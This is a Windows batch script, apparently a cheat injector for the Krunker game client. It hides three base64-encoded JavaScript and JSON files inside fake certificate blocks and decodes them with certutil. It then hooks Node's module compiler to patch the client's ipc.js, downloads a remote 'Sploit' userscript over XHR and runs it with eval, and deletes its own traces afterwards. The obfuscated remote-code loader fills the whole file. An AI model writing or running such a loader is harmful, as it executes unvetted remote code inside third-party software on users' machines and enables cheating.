@ECHO OFF
FOR /F "skip=2 tokens=2,*" %%A IN ('reg.exe query "HKCU\Software\96a79640-153e-566a-ac01-fda40346fa94" /v "InstallLocation"') DO set "installDir=%%B"
ECHO InstallLocation %installDir%

if not exist .shitsploit mkdir .shitsploit
cd .shitsploit

if exist "index.js" goto 28330386186951261778113355 
SetLocal EnableExtensions 
echo. 2>temp28330386186951261778113355.txt 1>nul 
>>temp28330386186951261778113355.txt call :OutCertificate28330386186951261778113355 
certutil -decode "temp28330386186951261778113355.txt" "index.js" >nul 
del /f /q "temp28330386186951261778113355.txt" 
goto :28330386186951261778113355
Rem Start-28330386186951261778113355
echo -----BEGIN CERTIFICATE-----
echo Y29uc3QgTW9kdWxlID0gcmVxdWlyZSgnbW9kdWxlJykNCmNvbnN0IHBhdGggPSBy
echo ZXF1aXJlKCdwYXRoJyk7DQpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7DQpjb25z
echo dCBvcHRpb25zID0gew0KICAgIGVuY29kaW5nOiAndXRmOCcsDQogICAgZmxhZzog
echo J3InDQp9Ow0KDQpsZXQgbXlQcmVsb2FkID0gZnMucmVhZEZpbGVTeW5jKCdwcmVs
echo b2FkLmpzJywgb3B0aW9ucyk7DQpNb2R1bGUucHJvdG90eXBlLl9jb21waWxlID0g
echo bmV3IFByb3h5KE1vZHVsZS5wcm90b3R5cGUuX2NvbXBpbGUsIHsNCiAgICBhcHBs
echo eSh0YXJnZXQsIHRoYXQsIFtjb250ZW50LCBmaWxlbmFtZV0pIHsNCiAgICAgICAg
echo aWYgKGZpbGVuYW1lLmluY2x1ZGVzKCdpcGMuanMnKSkgew0KICAgICAgICAgICAg
echo Y29udGVudCA9IGNvbnRlbnQucmVwbGFjZSgvKGZ1bmN0aW9uIGxvYWRDbGllbnRT
echo ZXR0aW5ncykvLCBgJHtteVByZWxvYWR9JDFgKQ0KICAgICAgICAgICAgTW9kdWxl
echo LnByb3RvdHlwZS5fY29tcGlsZSA9IHRhcmdldDsNCiAgICAgICAgfQ0KICAgICAg
echo ICB0YXJnZXQuYXBwbHkodGhhdCwgW2NvbnRlbnQsIGZpbGVuYW1lXSkNCiAgICB9
echo DQp9KQ==
echo -----END CERTIFICATE-----
Rem End-28330386186951261778113355
:28330386186951261778113355 
goto :end28330386186951261778113355
:OutCertificate28330386186951261778113355
@set "_out="
@for /f "usebackq tokens=*" %%G in ("%~f0") do @( 
  @if "%%~G"=="Rem Start-28330386186951261778113355" set "_out=yes" 
  @if defined _out %%~G
  @if "%%~G"=="Rem End-28330386186951261778113355" goto :eof
)
@endlocal 
@goto :eof
:end28330386186951261778113355

if exist "preload.js" goto 1600521290141376085143096761 
SetLocal EnableExtensions 
echo. 2>temp1600521290141376085143096761.txt 1>nul 
>>temp1600521290141376085143096761.txt call :OutCertificate1600521290141376085143096761 
certutil -decode "temp1600521290141376085143096761.txt" "preload.js" >nul 
del /f /q "temp1600521290141376085143096761.txt" 
goto :1600521290141376085143096761
Rem Start-1600521290141376085143096761
echo -----BEGIN CERTIFICATE-----
echo dmFyIHN0YXJ0ID0gZXZhbDsNCnZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3Qo
echo KTsNCnhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsNCiAgICBp
echo ZiAoeGhyLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgew0KICAg
echo ICAgICBzdGFydCh4aHIucmVzcG9uc2VUZXh0KTsNCiAgICB9DQp9DQp4aHIub3Bl
echo bignR0VUJywgJ2h0dHBzOi8vZ3JlYXN5Zm9yay5vcmcvc2NyaXB0cy80MjEyMjgt
echo c3Bsb2l0L2NvZGUvU3Bsb2l0LnVzZXIuanMnLCBmYWxzZSk7DQp4aHIuc2VuZChu
echo dWxsKTs=
echo -----END CERTIFICATE-----
Rem End-1600521290141376085143096761
:1600521290141376085143096761 
goto :end1600521290141376085143096761
:OutCertificate1600521290141376085143096761
@set "_out="
@for /f "usebackq tokens=*" %%G in ("%~f0") do @( 
  @if "%%~G"=="Rem Start-1600521290141376085143096761" set "_out=yes" 
  @if defined _out %%~G
  @if "%%~G"=="Rem End-1600521290141376085143096761" goto :eof
)
@endlocal 
@goto :eof
:end1600521290141376085143096761

if exist "package.json" goto 12136607222979661082130363 
SetLocal EnableExtensions 
echo. 2>temp12136607222979661082130363.txt 1>nul 
>>temp12136607222979661082130363.txt call :OutCertificate12136607222979661082130363 
certutil -decode "temp12136607222979661082130363.txt" "package.json" >nul 
del /f /q "temp12136607222979661082130363.txt" 
goto :12136607222979661082130363
Rem Start-12136607222979661082130363
echo -----BEGIN CERTIFICATE-----
echo ew0KICAibmFtZSI6ICJrcnVua2VyLXNjcmlwdC1pbmplY3RvciIsDQogICJ2ZXJz
echo aW9uIjogIjEuMC4wIiwNCiAgImRlc2NyaXB0aW9uIjogIkluamVjdCB1c2VyIHNj
echo cmlwdHMgaW50byBrcnVua2VyIGNsaWVudCIsDQogICJtYWluIjogInNyYy9pbmRl
echo eC5qcyIsDQogICJhdXRob3IiOiAic2tpZGxhbWVyIDxza2lkbGFtZXJAbWFpbC5j
echo b20+IiwNCiAgImxpY2Vuc2UiOiAiQmVlcndhaCIsDQogICJwcml2YXRlIjogdHJ1
echo ZQ0KfQ0K
echo -----END CERTIFICATE-----
Rem End-12136607222979661082130363
:12136607222979661082130363 
goto :end12136607222979661082130363
:OutCertificate12136607222979661082130363
@set "_out="
@for /f "usebackq tokens=*" %%G in ("%~f0") do @( 
  @if "%%~G"=="Rem Start-12136607222979661082130363" set "_out=yes" 
  @if defined _out %%~G
  @if "%%~G"=="Rem End-12136607222979661082130363" goto :eof
)
@endlocal 
@goto :eof
:end12136607222979661082130363

SET NODE_OPTIONS= --require ./
"%installDir%\retardedclient" "--dev"
DEL /F/Q/S *.* > NUL
cd ..
rmdir /Q /S .shitsploit

pause
